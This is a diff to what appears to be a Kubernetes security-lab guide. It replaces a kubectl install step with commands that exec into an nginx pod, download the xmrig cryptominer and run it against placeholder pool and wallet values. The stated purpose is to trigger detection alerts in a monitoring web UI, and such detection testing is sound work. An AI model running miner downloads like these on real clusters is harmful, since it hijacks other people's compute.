@@ -412,9 +412,9 @@ Exec into the pod to make binary changes
 kubectl exec pod/nginx-deployment-**** -it -- bash
 ```
 
-Install kubectl binary with curl on Linux
+Install ```xmrig``` binary with curl on Linux
 ```
-curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" --insecure
+curl -LO https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-bionic-x64.tar.gz
 ```
 
 If it fails (and it should), make sure to run kubectl update
@@ -427,9 +427,12 @@ Proceed to install cURL so that we can download the binary
 apt install curl
 ```
 
-Then follow the kubectl install flow identified in: <br/>
-https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
-
+Then follow the cryptomining install flow: <br/>
+```
+curl -LO https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-bionic-x64.tar.gz
+tar xf xmrig-6.14.1-bionic-x64.tar.gz
+xmrig-6.14.1/xmrig -o pool.com:1234 -u walletaddress
+```
 
 This should trigger the alerts within the web UI:
 <img width="1434" alt="Screenshot 2022-08-19 at 11 38 43" src="https://user-images.githubusercontent.com/109959738/185602537-d510a079-118d-4ea4-ada2-4658fba49d08.png">
